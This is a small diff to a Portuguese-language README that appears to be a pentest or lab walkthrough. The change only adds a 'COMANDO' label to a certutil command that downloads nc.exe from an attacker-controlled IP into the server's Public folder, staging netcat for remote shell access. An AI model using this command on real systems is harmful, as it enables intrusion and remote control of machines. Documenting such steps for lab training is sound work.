@@ -23,5 +23,5 @@
 ![image](https://github.com/user-attachments/assets/12480b70-9d3b-48d9-aee4-69a7113a6b31)
 ## vc vai upar o nc.exe no public do servidor onde "todos tem acesso"
 ```readme.md
-  # certutil -urlcache -split -f http://172.18.230.189/nc.exe C:\Users\Public\nc.exe
+ COMANDO : # certutil -urlcache -split -f http://172.18.230.189/nc.exe C:\Users\Public\nc.exe
 ```
